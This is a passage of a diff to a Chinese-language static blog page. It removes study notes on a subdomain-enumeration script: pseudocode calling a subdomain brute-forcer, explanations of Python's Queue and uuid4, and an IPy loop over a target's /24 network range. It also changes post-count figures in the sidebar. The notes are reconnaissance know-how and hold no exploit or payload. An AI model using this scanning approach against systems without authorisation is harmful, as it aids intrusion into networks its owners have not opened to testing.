不是泛解析 and ksudomain存在:</span><br><span class="line">	--定义ksudomains=调用ksudomain脚本跑子域名callKsubdomain()</span><br><span class="line">else</span><br><span class="line">	ksudomains=[]</span><br><span class="line">打印ksudomain跑的子域名结果</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printGetNewSubdomains()#########################################</span><br><span class="line">if 域名的长度&gt;0:</span><br><span class="line">	--定义newSubdomains=</span><br></pre></td></tr></table></figure>
-
-<p>没学过的模块及其函数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">allTargets_Queue = Queue(-1)	//新建一个队列，先进先出，空间无上限</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">Queue():</span><br><span class="line">模块结构:Queue--&gt;Queue(maxsize)</span><br><span class="line">返回一个队列对象，先进先出；如果maxsize小于等于0，则队列大小无限制</span><br><span class="line"></span><br><span class="line">queue.qsize() 返回队列的大小</span><br><span class="line">queue.empty() 如果队列为空，返回True,反之False</span><br><span class="line">queue.full() 如果队列满了，返回True,反之False</span><br><span class="line">queue.full 与 maxsize 大小对应</span><br><span class="line">queue.get([block[, timeout]])获取队列，timeout等待时间</span><br><span class="line">queue.get_nowait() 相当queue.get(False)</span><br><span class="line">queue.put(item) 写入队列，timeout等待时间</span><br><span class="line">queue.put_nowait(item) 相当queue.put(item, False)</span><br><span class="line">queue.task_done() 在完成一项工作之后，queue.task_done()函数向任务已经完成的队列发送一个信号</span><br><span class="line">queue.join() 实际上意味着等到队列为空，再执行别的操作</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">for ip in IP(&#x27;&#123;&#125;/24&#x27;.format(CIP)):	//遍历CIP变量所代表C端的所有ip地址</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">IP():</span><br><span class="line">模块结构：IPy--&gt;IP()</span><br><span class="line">返回IP网段对象以供处理</span><br><span class="line"></span><br><span class="line">ip=IP(&quot;192.168.0.0/16&quot;)	//定义ip网段</span><br><span class="line">ip.len()	//返回网段的ip个数</span><br><span class="line">for x in ip:</span><br><span class="line">	print(x)	//遍历输出ip</span><br><span class="line">ip.reverseName()	//反向解析地址格式</span><br><span class="line">ip.iptype()	//判断私有地址还是公有地址</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">save_fold_path = os.getcwd() + &#x27;/result/&#x27; + str(uuid4()).split(&#x27;-&#x27;)[-1]	//定义变量存储保存路径save_fold_path=当前目录+/result/+唯一标识uuid随机数的最后一段</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">uuid4():</span><br><span class="line">模块结构：uuid--&gt;uuid4()</span><br><span class="line">返回一个通过MAC地址, 时间戳, 命名空间, 随机数, 伪随机数来生成的唯一id标识</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newSubdomains = list(set(new_subdomains) - set(old_subdomains))	//将一个列表set()为一个元素不重复的集合，再用new_subdomains生成的集合(刚跑完的脚本收集的子域名)-old_subdomains生成的集合(前面已经收集好的子域名)，将会对比出new_subdomains中不存在于old_subdomains中的元素的集合，最后list()依靠这个集合生成一个列表，返回给newSubdomains覆盖保存</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1239,7 +1218,7 @@ Apache Tomcat 6.x
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">52</span>
+          <span class="site-state-item-count">54</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1283,7 +1262,7 @@ Apache Tomcat 6.x
   </div>
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共32.6k字</span>
+  <span class="post-count">博客全站共41k字</span>
 </div>
 
     <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
